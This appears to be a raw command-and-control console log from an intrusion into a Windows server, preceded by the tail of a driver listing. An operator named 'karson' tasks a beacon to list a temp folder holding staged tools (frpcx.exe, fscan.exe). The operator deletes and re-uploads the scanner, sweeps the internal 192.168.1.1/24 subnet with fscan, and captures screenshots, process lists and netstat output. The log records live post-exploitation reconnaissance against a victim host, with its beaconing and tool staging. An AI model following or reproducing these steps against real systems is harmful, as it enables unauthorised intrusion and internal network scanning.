+dmio         Logical Disk Manager D Kernel        2/17/2007 2:10:44 PM  
+dmload       dmload                 Kernel        3/25/2003 3:08:08 PM  
+DMusic       Microsoft Kernel DLS S Kernel        2/17/2007 2:11:55 PM  
+drmkaud      Microsoft Kernel DRM A Kernel        3/25/2003 3:09:54 PM  
+e1kexpress   Intel(R) PRO/1000 PCI  Kernel        6/20/2009 8:51:41 AM  
+EL90XBC      3Com EtherLink XL 90XB Kernel        3/19/2002 4:06:35 AM  
+Fastfat      Fastfat                File System   2/17/2007 2:27:55 PM  
+Fdc          Floppy Disk Controller Kernel        2/17/2007 2:07:16 PM  
+Fips         Fips                   Kernel        2/17/2007 2:26:33 PM  
+Flpydisk     Floppy Disk Driver     Kernel        3/25/2003 3:04:32 PM  
+FltMgr       FltMgr                 File System   2/17/2007 1:51:08 PM  
+Ftdisk       Volume Manager Driver  Kernel        2/17/2007 2:08:05 PM  
+Gpc          Generic Packet Classif Kernel        2/17/2007 1:58:37 PM  
+HDAudBus     Microsoft UAA Bus Driv Kernel        5/26/2005 11:46:29 PM 
+hidusb       Microsoft HID Class Dr Kernel        3/25/2003 3:10:17 PM  
+HTTP         HTTP                   Kernel        4/15/2010 1:37:09 AM  
+i8042prt     i8042 Keyboard and PS/ Kernel        2/17/2007 2:30:40 PM  
+ialm         ialm                   Kernel        7/24/2012 5:43:23 AM  
+imapi        CD-Burning Filter Driv Kernel        2/17/2007 2:08:22 PM  
+IntcAzAudAdd Service for Realtek HD Kernel        9/21/2009 6:01:19 PM  
+IntcHdmiAddS Intel(R) High Definiti Kernel        4/8/2009 6:32:48 PM   
+intelppm     Intel Processor Driver Kernel        2/17/2007 1:48:30 PM  
+Ip6Fw        IPv6 Windows Firewall  Kernel        2/17/2007 1:56:24 PM  
+IpFilterDriv IP Traffic Filter Driv Kernel        2/17/2007 1:59:05 PM  
+IpNat        IP Network Address Tra Kernel        2/17/2007 1:59:08 PM  
+IPSec        IPSEC driver           Kernel        2/17/2007 2:29:28 PM  
+isapnp       PnP ISA/EISA Bus Drive Kernel        2/17/2007 1:58:57 PM  
+Kbdclass     Keyboard Class Driver  Kernel        2/17/2007 2:05:39 PM  
+kbdhid       Keyboard HID Driver    Kernel        2/17/2007 2:05:42 PM  
+kmixer       Microsoft Kernel Wave  Kernel        2/17/2007 2:12:15 PM  
+KSecDD       KSecDD                 Kernel        6/1/2012 8:47:07 PM   
+mnmdd        mnmdd                  Kernel        3/25/2003 3:07:53 PM  
+Modem        Modem                  Kernel        2/17/2007 2:01:30 PM  
+Monfilt      Monfilt                Kernel        1/4/2006 3:41:48 PM   
+Mouclass     Mouse Class Driver     Kernel        3/25/2003 3:03:09 PM  
+mouhid       Mouse HID Driver       Kernel        3/25/2003 3:03:12 PM  
+MountMgr     Mount Point Manager    Kernel        2/17/2007 2:05:35 PM  
+MRxDAV       WebDav Client Redirect File System   12/17/2007 6:49:07 PM 
+MRxSmb       MRXSMB                 File System   7/6/2011 10:34:54 PM  
+Msfs         Msfs                   File System   2/17/2007 1:50:33 PM  
+MSKSSRV      Microsoft Streaming Se Kernel        2/17/2007 2:05:55 PM  
+MSPCLOCK     Microsoft Streaming Cl Kernel        2/17/2007 2:05:50 PM  
+MSPQM        Microsoft Streaming Qu Kernel        2/17/2007 2:05:54 PM  
+mssmbios     Microsoft System Manag Kernel        2/17/2007 1:59:12 PM  
+Mup          Mup                    File System   4/13/2011 3:05:46 AM  
+NDIS         NDIS System Driver     Kernel        2/17/2007 2:28:49 PM  
+NdisTapi     Remote Access NDIS TAP Kernel        7/8/2011 10:08:19 PM  
+Ndisuio      NDIS Usermode I/O Prot Kernel        2/17/2007 1:58:25 PM  
+NdisWan      Remote Access NDIS WAN Kernel        2/17/2007 2:29:22 PM  
+NDProxy      NDIS Proxy             Kernel        11/3/2010 9:25:59 PM  
+NetBIOS      NetBIOS Interface      File System   2/17/2007 1:58:29 PM  
+NetBT        NetBios over Tcpip     Kernel        2/17/2007 2:28:57 PM  
+Npfs         Npfs                   File System   2/17/2007 1:50:36 PM  
+Ntfs         Ntfs                   File System   2/17/2007 2:27:23 PM  
+Null         Null                   Kernel        3/25/2003 3:03:05 PM  
+nv           nv                     Kernel        10/5/2007 8:47:27 AM  
+NVENETFD     NVIDIA nForce Networki Kernel        9/21/2007 10:07:37 AM 
+nvnetbus     NVIDIA Network Bus Enu Kernel        9/21/2007 10:07:39 AM 
+Parport      Parallel port driver   Kernel        2/17/2007 2:06:42 PM  
+PartMgr      Partition Manager      Kernel        2/17/2007 2:29:25 PM  
+Parvdm       Parvdm                 Kernel        3/25/2003 3:03:49 PM  
+PCI          PCI Bus Driver         Kernel        2/17/2007 1:59:03 PM  
+PCIIde       PCIIde                 Kernel        3/25/2003 3:04:46 PM  
+Pcmcia       Pcmcia                 Kernel        2/17/2007 1:59:01 PM  
+PptpMiniport WAN Miniport (PPTP)    Kernel        2/17/2007 2:29:20 PM  
+Processor    Processor Driver       Kernel        2/17/2007 1:48:28 PM  
+Ptilink      Direct Parallel Link D Kernel        2/17/2007 2:06:38 PM  
+RasAcd       Remote Access Auto Con Kernel        3/25/2003 3:11:50 PM  
+Rasl2tp      WAN Miniport (L2TP)    Kernel        2/17/2007 2:29:02 PM  
+RasPppoe     Remote Access PPPOE Dr Kernel        2/17/2007 1:59:23 PM  
+Raspti       Direct Parallel        Kernel        2/17/2007 1:59:23 PM  
+Rdbss        Rdbss                  File System   2/24/2010 11:54:03 PM 
+RDPCDD       RDPCDD                 Kernel        3/25/2003 3:03:05 PM  
+rdpdr        Terminal Server Device Kernel        2/17/2007 1:51:00 PM  
+RDPWD        RDPWD                  Kernel        5/1/2012 8:45:40 PM   
+redbook      Digital CD Audio Playb Kernel        2/17/2007 2:07:26 PM  
+Secdrv       Secdrv                 Kernel        9/13/2006 9:18:32 PM  
+serenum      Serenum Filter Driver  Kernel        2/17/2007 2:06:44 PM  
+Serial       Serial port driver     Kernel        2/17/2007 2:06:46 PM  
+Sfloppy      Sfloppy                Kernel        3/25/2003 3:05:20 PM  
+splitter     Microsoft Kernel Audio Kernel        2/17/2007 2:12:16 PM  
+Srv          Srv                    File System   2/18/2011 12:58:17 AM 
+swenum       Software Bus Driver    Kernel        2/17/2007 2:05:56 PM  
+swmidi       Microsoft Kernel GS Wa Kernel        2/17/2007 2:12:16 PM  
+sysaudio     Microsoft Kernel Syste Kernel        2/17/2007 2:28:59 PM  
+Tcpip        TCP/IP Protocol Driver Kernel        8/15/2009 5:53:38 PM  
+TDPIPE       TDPIPE                 Kernel        2/17/2007 1:44:31 PM  
+TDTCP        TDTCP                  Kernel        2/17/2007 1:44:32 PM  
+TermDD       Terminal Device Driver Kernel        2/17/2007 1:44:32 PM  
+tpm          tpm                    Kernel        6/20/2008 11:44:11 AM 
+Udfs         Udfs                   File System   2/17/2007 1:50:32 PM  
+Update       Microcode Update Drive Kernel        5/28/2007 8:15:16 PM  
+usbccgp      Microsoft USB Generic  Kernel        2/17/2007 2:13:08 PM  
+usbehci      Microsoft USB 2.0 Enha Kernel        2/17/2007 2:12:56 PM  
+usbhub       USB2 Enabled Hub       Kernel        2/17/2007 2:13:05 PM  
+usbohci      Microsoft USB Open Hos Kernel        2/17/2007 2:13:01 PM  
+usbscan      USB Scanner Driver     Kernel        2/17/2007 2:03:09 PM  
+USBSTOR      USB Mass Storage Drive Kernel        2/17/2007 2:13:05 PM  
+usbuhci      Microsoft USB Universa Kernel        2/17/2007 2:13:02 PM  
+vga          vga                    Kernel        2/17/2007 2:10:30 PM  
+VgaSave      VGA Display Controller Kernel        2/17/2007 2:10:30 PM  
+VIAHdAudAddS VIA High Definition Au Kernel        12/12/2007 2:35:44 PM 
+VolSnap      Storage volumes        Kernel        8/21/2012 8:56:23 PM  
+VRVD302      VRVD302                Kernel        5/16/2007 11:15:37 AM 
+Wanarp       Remote Access IP ARP D Kernel        2/17/2007 1:59:17 PM  
+wd           Microsoft Watchdog Tim Kernel        3/25/2003 3:09:12 PM  
+Wdf01000     Kernel Mode Driver Fra Kernel        1/19/2008 1:52:21 PM  
+wdmaud       Microsoft WINMM WDM Au Kernel        2/17/2007 2:30:05 PM  
+WLBS         Network Load Balancing Kernel        2/17/2007 2:27:46 PM  
+WmiAcpi      Microsoft Windows Mana Kernel        2/17/2007 1:58:52 PM
+Recent Info:
+
+
+Finished!
+End: 2024-02-04 18:30:42
+
+
+02/04 10:40:12 UTC [input] <karson> shell dir
+02/04 10:40:12 UTC [task] <T1059> Tasked beacon to run: dir
+02/04 10:40:13 UTC [checkin] host called home, sent: 34 bytes
+02/04 10:40:13 UTC [output]
+received output:
+ Volume in drive C is Local Disk
+ Volume Serial Number is D150-1FD0
+
+ Directory of C:\Windows\Temp
+
+02/04/2024  05:07 PM    <DIR>          .
+02/04/2024  05:07 PM    <DIR>          ..
+04/27/2018  09:32 AM    <DIR>          EUSQLMDB
+04/27/2018  09:32 AM    <DIR>          EUTBPOLICY
+04/27/2018  09:32 AM    <DIR>          EUTBSCH
+02/04/2024  05:07 PM         9,107,456 frpcx.exe
+02/04/2024  04:55 PM         4,546,560 fscan.exe
+07/18/2012  09:54 AM    <DIR>          hsperfdata_SYSTEM
+11/14/2010  03:00 AM    <DIR>          KB2416472_10.0.30319
+04/15/2011  03:01 AM    <DIR>          KB2446708_10.0.30319
+08/17/2011  07:56 PM    <DIR>          KB2473228_10.0.30319
+08/17/2011  07:53 PM    <DIR>          KB2487367_10.0.30319
+08/17/2011  07:49 PM    <DIR>          KB2518870_10.0.30319
+08/17/2011  07:43 PM    <DIR>          KB2539636_10.0.30319
+03/12/2012  07:07 PM    <DIR>          KB2633870_10.0.30319
+09/27/2010  03:22 PM    <DIR>          sophos_autoupdate1.dir
+05/07/2018  01:51 PM             1,093 tmp1DFD.tmp
+07/20/2018  04:47 PM    <DIR>          vmware-temp
+04/27/2018  10:50 AM    <DIR>          _isTmp_{8675309}
+               3 File(s)     13,655,109 bytes
+              16 Dir(s)  24,287,457,280 bytes free
+
+
+02/04 10:40:30 UTC [input] <karson> shell fscan.exe -h
+02/04 10:40:30 UTC [task] <T1059> Tasked beacon to run: fscan.exe -h
+02/04 10:40:30 UTC [checkin] host called home, sent: 55 bytes
+02/04 10:41:12 UTC [input] <karson> shell del fscan.exe
+02/04 10:41:12 UTC [task] <T1059> Tasked beacon to run: del fscan.exe
+02/04 10:41:13 UTC [checkin] host called home, sent: 44 bytes
+02/04 10:42:10 UTC [input] <karson> shell dir
+02/04 10:42:10 UTC [task] <T1059> Tasked beacon to run: dir
+02/04 10:42:10 UTC [checkin] host called home, sent: 34 bytes
+02/04 10:42:10 UTC [output]
+received output:
+ Volume in drive C is Local Disk
+ Volume Serial Number is D150-1FD0
+
+ Directory of C:\Windows\Temp
+
+02/04/2024  06:42 PM    <DIR>          .
+02/04/2024  06:42 PM    <DIR>          ..
+04/27/2018  09:32 AM    <DIR>          EUSQLMDB
+04/27/2018  09:32 AM    <DIR>          EUTBPOLICY
+04/27/2018  09:32 AM    <DIR>          EUTBSCH
+02/04/2024  05:07 PM         9,107,456 frpcx.exe
+07/18/2012  09:54 AM    <DIR>          hsperfdata_SYSTEM
+11/14/2010  03:00 AM    <DIR>          KB2416472_10.0.30319
+04/15/2011  03:01 AM    <DIR>          KB2446708_10.0.30319
+08/17/2011  07:56 PM    <DIR>          KB2473228_10.0.30319
+08/17/2011  07:53 PM    <DIR>          KB2487367_10.0.30319
+08/17/2011  07:49 PM    <DIR>          KB2518870_10.0.30319
+08/17/2011  07:43 PM    <DIR>          KB2539636_10.0.30319
+03/12/2012  07:07 PM    <DIR>          KB2633870_10.0.30319
+09/27/2010  03:22 PM    <DIR>          sophos_autoupdate1.dir
+05/07/2018  01:51 PM             1,093 tmp1DFD.tmp
+07/20/2018  04:47 PM    <DIR>          vmware-temp
+04/27/2018  10:50 AM    <DIR>          _isTmp_{8675309}
+               2 File(s)      9,108,549 bytes
+              16 Dir(s)  24,290,566,144 bytes free
+
+
+02/04 10:44:13 UTC [input] <karson> shell dir
+02/04 10:44:13 UTC [task] <T1059> Tasked beacon to run: dir
+02/04 10:44:13 UTC [checkin] host called home, sent: 34 bytes
+02/04 10:44:13 UTC [output]
+received output:
+ Volume in drive C is Local Disk
+ Volume Serial Number is D150-1FD0
+
+ Directory of C:\Windows\Temp
+
+02/04/2024  06:44 PM    <DIR>          .
+02/04/2024  06:44 PM    <DIR>          ..
+04/27/2018  09:32 AM    <DIR>          EUSQLMDB
+04/27/2018  09:32 AM    <DIR>          EUTBPOLICY
+04/27/2018  09:32 AM    <DIR>          EUTBSCH
+02/04/2024  05:07 PM         9,107,456 frpcx.exe
+02/04/2024  06:44 PM               469 fscan32.exe
+07/18/2012  09:54 AM    <DIR>          hsperfdata_SYSTEM
+11/14/2010  03:00 AM    <DIR>          KB2416472_10.0.30319
+04/15/2011  03:01 AM    <DIR>          KB2446708_10.0.30319
+08/17/2011  07:56 PM    <DIR>          KB2473228_10.0.30319
+08/17/2011  07:53 PM    <DIR>          KB2487367_10.0.30319
+08/17/2011  07:49 PM    <DIR>          KB2518870_10.0.30319
+08/17/2011  07:43 PM    <DIR>          KB2539636_10.0.30319
+03/12/2012  07:07 PM    <DIR>          KB2633870_10.0.30319
+09/27/2010  03:22 PM    <DIR>          sophos_autoupdate1.dir
+05/07/2018  01:51 PM             1,093 tmp1DFD.tmp
+07/20/2018  04:47 PM    <DIR>          vmware-temp
+04/27/2018  10:50 AM    <DIR>          _isTmp_{8675309}
+               3 File(s)      9,109,018 bytes
+              16 Dir(s)  24,291,090,432 bytes free
+
+
+02/04 10:44:32 UTC [input] <karson> shell del fscan32.exe
+02/04 10:44:32 UTC [task] <T1059> Tasked beacon to run: del fscan32.exe
+02/04 10:44:32 UTC [checkin] host called home, sent: 46 bytes
+02/04 10:46:18 UTC [input] <karson> shell dir
+02/04 10:46:18 UTC [task] <T1059> Tasked beacon to run: dir
+02/04 10:46:19 UTC [checkin] host called home, sent: 34 bytes
+02/04 10:46:19 UTC [output]
+received output:
+ Volume in drive C is Local Disk
+ Volume Serial Number is D150-1FD0
+
+ Directory of C:\Windows\Temp
+
+02/04/2024  06:47 PM    <DIR>          .
+02/04/2024  06:47 PM    <DIR>          ..
+04/27/2018  09:32 AM    <DIR>          EUSQLMDB
+04/27/2018  09:32 AM    <DIR>          EUTBPOLICY
+04/27/2018  09:32 AM    <DIR>          EUTBSCH
+02/04/2024  05:07 PM         9,107,456 frpcx.exe
+02/04/2024  06:47 PM         5,490,176 fscan32.exe
+07/18/2012  09:54 AM    <DIR>          hsperfdata_SYSTEM
+11/14/2010  03:00 AM    <DIR>          KB2416472_10.0.30319
+04/15/2011  03:01 AM    <DIR>          KB2446708_10.0.30319
+08/17/2011  07:56 PM    <DIR>          KB2473228_10.0.30319
+08/17/2011  07:53 PM    <DIR>          KB2487367_10.0.30319
+08/17/2011  07:49 PM    <DIR>          KB2518870_10.0.30319
+08/17/2011  07:43 PM    <DIR>          KB2539636_10.0.30319
+03/12/2012  07:07 PM    <DIR>          KB2633870_10.0.30319
+09/27/2010  03:22 PM    <DIR>          sophos_autoupdate1.dir
+05/07/2018  01:51 PM             1,093 tmp1DFD.tmp
+07/20/2018  04:47 PM    <DIR>          vmware-temp
+04/27/2018  10:50 AM    <DIR>          _isTmp_{8675309}
+               3 File(s)     14,598,725 bytes
+              16 Dir(s)  24,286,121,984 bytes free
+
+
+02/04 10:46:52 UTC [input] <karson> shell fscan32.exe -h 192.168.1.1/24 -o out.txt
+02/04 10:46:52 UTC [task] <T1059> Tasked beacon to run: fscan32.exe -h 192.168.1.1/24 -o out.txt
+02/04 10:46:52 UTC [checkin] host called home, sent: 71 bytes
+02/04 10:47:31 UTC [input] <karson> shell dir
+02/04 10:47:31 UTC [task] <T1059> Tasked beacon to run: dir
+02/04 10:47:32 UTC [checkin] host called home, sent: 34 bytes
+02/04 10:47:32 UTC [output]
+received output:
+ Volume in drive C is Local Disk
+ Volume Serial Number is D150-1FD0
+
+ Directory of C:\Windows\Temp
+
+02/04/2024  06:47 PM    <DIR>          .
+02/04/2024  06:47 PM    <DIR>          ..
+04/27/2018  09:32 AM    <DIR>          EUSQLMDB
+04/27/2018  09:32 AM    <DIR>          EUTBPOLICY
+04/27/2018  09:32 AM    <DIR>          EUTBSCH
+02/04/2024  05:07 PM         9,107,456 frpcx.exe
+02/04/2024  06:47 PM         5,490,176 fscan32.exe
+07/18/2012  09:54 AM    <DIR>          hsperfdata_SYSTEM
+11/14/2010  03:00 AM    <DIR>          KB2416472_10.0.30319
+04/15/2011  03:01 AM    <DIR>          KB2446708_10.0.30319
+08/17/2011  07:56 PM    <DIR>          KB2473228_10.0.30319
+08/17/2011  07:53 PM    <DIR>          KB2487367_10.0.30319
+08/17/2011  07:49 PM    <DIR>          KB2518870_10.0.30319
+08/17/2011  07:43 PM    <DIR>          KB2539636_10.0.30319
+03/12/2012  07:07 PM    <DIR>          KB2633870_10.0.30319
+09/27/2010  03:22 PM    <DIR>          sophos_autoupdate1.dir
+05/07/2018  01:51 PM             1,093 tmp1DFD.tmp
+07/20/2018  04:47 PM    <DIR>          vmware-temp
+04/27/2018  10:50 AM    <DIR>          _isTmp_{8675309}
+               3 File(s)     14,598,725 bytes
+              16 Dir(s)  24,284,938,240 bytes free
+
+
+02/04 10:47:42 UTC [input] <karson> tasklist
+02/04 10:47:42 UTC [error] Unknown command: tasklist
+02/04 10:47:51 UTC [input] <karson> shell tasklist
+02/04 10:47:51 UTC [task] <T1059> Tasked beacon to run: tasklist
+02/04 10:47:51 UTC [checkin] host called home, sent: 39 bytes
+02/04 10:47:51 UTC [output]
+received output:
+
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System Idle Process              0 Console                    0         28 K
+System                           4 Console                    0        272 K
+smss.exe                       376 Console                    0        520 K
+csrss.exe                      424 Console                    0      5,956 K
+winlogon.exe                   448 Console                    0     10,968 K
+services.exe                   496 Console                    0     53,504 K
+lsass.exe                      508 Console                    0     14,208 K
+svchost.exe                    668 Console                    0      3,340 K
+svchost.exe                    760 Console                    0      4,776 K
+svchost.exe                    832 Console                    0      5,956 K
+svchost.exe                    868 Console                    0      7,068 K
+svchost.exe                    884 Console                    0     28,268 K
+msdtc.exe                     1056 Console                    0      5,100 K
+cisvc.exe                     1168 Console                    0      1,924 K
+svchost.exe                   1248 Console                    0      2,564 K
+hMailServer.exe               1280 Console                    0      8,004 K
+inetinfo.exe                  1392 Console                    0     12,596 K
+jqs.exe                       1416 Console                    0      1,428 K
+LMS.exe                       1464 Console                    0      2,808 K
+MsDtsSrvr.exe                 1484 Console                    0     19,888 K
+sqlservr.exe                  1580 Console                    0  1,086,832 K
+msmdsrv.exe                   1636 Console                    0     23,476 K
+svchost.exe                   1740 Console                    0      2,016 K
+ReportingServicesService.     1760 Console                    0     89,568 K
+sqlbrowser.exe                1856 Console                    0      7,824 K
+sqlwriter.exe                 1920 Console                    0      4,144 K
+UNS.exe                       1964 Console                    0     64,628 K
+winvnc4.exe                   2140 Console                    0      4,756 K
+msftesql.exe                  2196 Console                    0      4,616 K
+svchost.exe                   2252 Console                    0      7,520 K
+SQLAGENT90.EXE                2496 Console                    0      7,264 K
+svchost.exe                   2632 Console                    0      5,500 K
+svchost.exe                   2656 Console                    0      4,404 K
+wmiprvse.exe                  2820 Console                    0      5,804 K
+alg.exe                       3052 Console                    0      3,308 K
+cidaemon.exe                  3636 Console                    0      1,444 K
+cidaemon.exe                  3676 Console                    0      1,544 K
+cidaemon.exe                  3844 Console                    0      1,592 K
+logon.scr                     3788 Console                    0      1,984 K
+csrss.exe                     3668 RDP-Tcp#34                 1      1,956 K
+winlogon.exe                   200 RDP-Tcp#34                 1      3,708 K
+rdpclip.exe                   3472 RDP-Tcp#34                 1      1,628 K
+explorer.exe                  3140 RDP-Tcp#34                 1     13,528 K
+jusched.exe                   1192 RDP-Tcp#34                 1      4,608 K
+RTHDCPL.EXE                   4072 RDP-Tcp#34                 1      2,328 K
+ctfmon.exe                    2364 RDP-Tcp#34                 1        604 K
+Tomcat7w.exe                   684 RDP-Tcp#34                 1        308 K
+SqlWb.exe                     1812 RDP-Tcp#34                 1     18,412 K
+wmiprvse.exe                  1228 Console                    0     10,720 K
+wuauclt.exe                   5544 RDP-Tcp#34                 1      4,004 K
+scrnsave.scr                  3920 RDP-Tcp#34                 1      1,588 K
+cmd1.exe                      4540 Console                    0      4,136 K
+w3wp.exe                       636 Console                    0     19,124 K
+cmd1.exe                      3892 Console                    0      1,840 K
+system.exe                    6080 Console                    0      7,280 K
+cmd.exe                        148 Console                    0      7,652 K
+cmd.exe                       4108 Console                    0      4,596 K
+cmd.exe                       5820 Console                    0      4,568 K
+cmd1.exe                       896 Console                    0      4,100 K
+cmd.exe                       4088 Console                    0      4,576 K
+cmd.exe                       3336 Console                    0      4,616 K
+cmd.exe                       4620 Console                    0      1,816 K
+tasklist.exe                  3308 Console                    0      4,224 K
+
+
+02/04 10:48:24 UTC [input] <karson> screenshot
+02/04 10:48:24 UTC [task] <T1113, T1093> Tasked beacon to take screenshot
+02/04 10:48:25 UTC [checkin] host called home, sent: 164036 bytes
+02/04 10:48:27 UTC [error] screenshot from desktop 0 is empty
+02/04 10:48:33 UTC [input] <karson> 
+02/04 10:48:33 UTC [error] Unknown command: 
+02/04 10:48:45 UTC [input] <karson> shell dir
+02/04 10:48:45 UTC [task] <T1059> Tasked beacon to run: dir
+02/04 10:48:45 UTC [checkin] host called home, sent: 34 bytes
+02/04 10:48:45 UTC [output]
+received output:
+ Volume in drive C is Local Disk
+ Volume Serial Number is D150-1FD0
+
+ Directory of C:\Windows\Temp
+
+02/04/2024  06:47 PM    <DIR>          .
+02/04/2024  06:47 PM    <DIR>          ..
+04/27/2018  09:32 AM    <DIR>          EUSQLMDB
+04/27/2018  09:32 AM    <DIR>          EUTBPOLICY
+04/27/2018  09:32 AM    <DIR>          EUTBSCH
+02/04/2024  05:07 PM         9,107,456 frpcx.exe
+02/04/2024  06:47 PM         5,490,176 fscan32.exe
+07/18/2012  09:54 AM    <DIR>          hsperfdata_SYSTEM
+11/14/2010  03:00 AM    <DIR>          KB2416472_10.0.30319
+04/15/2011  03:01 AM    <DIR>          KB2446708_10.0.30319
+08/17/2011  07:56 PM    <DIR>          KB2473228_10.0.30319
+08/17/2011  07:53 PM    <DIR>          KB2487367_10.0.30319
+08/17/2011  07:49 PM    <DIR>          KB2518870_10.0.30319
+08/17/2011  07:43 PM    <DIR>          KB2539636_10.0.30319
+03/12/2012  07:07 PM    <DIR>          KB2633870_10.0.30319
+09/27/2010  03:22 PM    <DIR>          sophos_autoupdate1.dir
+05/07/2018  01:51 PM             1,093 tmp1DFD.tmp
+07/20/2018  04:47 PM    <DIR>          vmware-temp
+04/27/2018  10:50 AM    <DIR>          _isTmp_{8675309}
+               3 File(s)     14,598,725 bytes
+              16 Dir(s)  24,285,921,280 bytes free
+
+
+02/04 10:49:02 UTC [input] <karson> shell
+02/04 10:49:02 UTC [error] shell error: not enough arguments
+02/04 10:49:55 UTC [input] <karson> shell dir
+02/04 10:49:55 UTC [task] <T1059> Tasked beacon to run: dir
+02/04 10:49:55 UTC [checkin] host called home, sent: 34 bytes
+02/04 10:49:55 UTC [output]
+received output:
+ Volume in drive C is Local Disk
+ Volume Serial Number is D150-1FD0
+
+ Directory of C:\Windows\Temp
+
+02/04/2024  06:47 PM    <DIR>          .
+02/04/2024  06:47 PM    <DIR>          ..
+04/27/2018  09:32 AM    <DIR>          EUSQLMDB
+04/27/2018  09:32 AM    <DIR>          EUTBPOLICY
+04/27/2018  09:32 AM    <DIR>          EUTBSCH
+02/04/2024  05:07 PM         9,107,456 frpcx.exe
+02/04/2024  06:47 PM         5,490,176 fscan32.exe
+07/18/2012  09:54 AM    <DIR>          hsperfdata_SYSTEM
+11/14/2010  03:00 AM    <DIR>          KB2416472_10.0.30319
+04/15/2011  03:01 AM    <DIR>          KB2446708_10.0.30319
+08/17/2011  07:56 PM    <DIR>          KB2473228_10.0.30319
+08/17/2011  07:53 PM    <DIR>          KB2487367_10.0.30319
+08/17/2011  07:49 PM    <DIR>          KB2518870_10.0.30319
+08/17/2011  07:43 PM    <DIR>          KB2539636_10.0.30319
+03/12/2012  07:07 PM    <DIR>          KB2633870_10.0.30319
+09/27/2010  03:22 PM    <DIR>          sophos_autoupdate1.dir
+05/07/2018  01:51 PM             1,093 tmp1DFD.tmp
+07/20/2018  04:47 PM    <DIR>          vmware-temp
+04/27/2018  10:50 AM    <DIR>          _isTmp_{8675309}
+               3 File(s)     14,598,725 bytes
+              16 Dir(s)  24,285,597,696 bytes free
+
+
+02/04 10:50:09 UTC [input] <karson> shell tasklist
+02/04 10:50:09 UTC [task] <T1059> Tasked beacon to run: tasklist
+02/04 10:50:09 UTC [checkin] host called home, sent: 39 bytes
+02/04 10:50:10 UTC [output]
+received output:
+
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System Idle Process              0 Console                    0         28 K
+System                           4 Console                    0        272 K
+smss.exe                       376 Console                    0        520 K
+csrss.exe                      424 Console                    0      5,956 K
+winlogon.exe                   448 Console                    0     10,972 K
+services.exe                   496 Console                    0     53,508 K
+lsass.exe                      508 Console                    0     14,216 K
+svchost.exe                    668 Console                    0      3,340 K
+svchost.exe                    760 Console                    0      4,776 K
+svchost.exe                    832 Console                    0      5,956 K
+svchost.exe                    868 Console                    0      7,068 K
+svchost.exe                    884 Console                    0     28,516 K
+msdtc.exe                     1056 Console                    0      5,100 K
+cisvc.exe                     1168 Console                    0      2,452 K
+svchost.exe                   1248 Console                    0      2,564 K
+hMailServer.exe               1280 Console                    0      8,004 K
+inetinfo.exe                  1392 Console                    0     12,596 K
+jqs.exe                       1416 Console                    0      1,488 K
+LMS.exe                       1464 Console                    0      2,808 K
+MsDtsSrvr.exe                 1484 Console                    0     19,888 K
+sqlservr.exe                  1580 Console                    0  1,086,832 K
+msmdsrv.exe                   1636 Console                    0     23,464 K
+svchost.exe                   1740 Console                    0      2,016 K
+ReportingServicesService.     1760 Console                    0     89,572 K
+sqlbrowser.exe                1856 Console                    0      7,824 K
+sqlwriter.exe                 1920 Console                    0      4,144 K
+UNS.exe                       1964 Console                    0     64,628 K
+winvnc4.exe                   2140 Console                    0      4,756 K
+msftesql.exe                  2196 Console                    0      4,616 K
+svchost.exe                   2252 Console                    0      7,528 K
+SQLAGENT90.EXE                2496 Console                    0      7,280 K
+svchost.exe                   2632 Console                    0      5,492 K
+svchost.exe                   2656 Console                    0      4,404 K
+wmiprvse.exe                  2820 Console                    0      5,804 K
+alg.exe                       3052 Console                    0      3,308 K
+cidaemon.exe                  3636 Console                    0      1,444 K
+cidaemon.exe                  3676 Console                    0      1,544 K
+cidaemon.exe                  3844 Console                    0      1,592 K
+logon.scr                     3788 Console                    0      1,984 K
+csrss.exe                     3668 RDP-Tcp#34                 1      1,956 K
+winlogon.exe                   200 RDP-Tcp#34                 1      3,708 K
+rdpclip.exe                   3472 RDP-Tcp#34                 1      1,628 K
+explorer.exe                  3140 RDP-Tcp#34                 1     13,528 K
+jusched.exe                   1192 RDP-Tcp#34                 1      4,608 K
+RTHDCPL.EXE                   4072 RDP-Tcp#34                 1      2,328 K
+ctfmon.exe                    2364 RDP-Tcp#34                 1        604 K
+Tomcat7w.exe                   684 RDP-Tcp#34                 1        308 K
+SqlWb.exe                     1812 RDP-Tcp#34                 1     18,412 K
+wmiprvse.exe                  1228 Console                    0     10,768 K
+wuauclt.exe                   5544 RDP-Tcp#34                 1      4,004 K
+scrnsave.scr                  3920 RDP-Tcp#34                 1      1,588 K
+cmd1.exe                      4540 Console                    0      4,136 K
+w3wp.exe                       636 Console                    0     19,100 K
+cmd1.exe                      3892 Console                    0      1,840 K
+system.exe                    6080 Console                    0      7,280 K
+cmd.exe                        148 Console                    0      7,652 K
+cmd.exe                       4108 Console                    0      4,596 K
+cmd.exe                       5820 Console                    0      4,568 K
+cmd1.exe                       896 Console                    0      4,100 K
+cmd.exe                       4088 Console                    0      4,576 K
+cmd.exe                       3336 Console                    0      4,616 K
+cmd.exe                        540 Console                    0      1,816 K
+tasklist.exe                  4460 Console                    0      4,224 K
+
+
+02/04 10:50:40 UTC [input] <karson> shell netstat -ano
+02/04 10:50:40 UTC [task] <T1059> Tasked beacon to run: netstat -ano
+02/04 10:50:41 UTC [checkin] host called home, sent: 55 bytes
+02/04 10:50:42 UTC [output]
+received output:
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:81             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:82             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:83             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:84             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:85             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:90             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       760
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:899            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING       508
+  TCP    0.0.0.0:1026           0.0.0.0:0              LISTENING       1056
+  TCP    0.0.0.0:1033           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       1580
+  TCP    0.0.0.0:1723           0.0.0.0:0              LISTENING       4
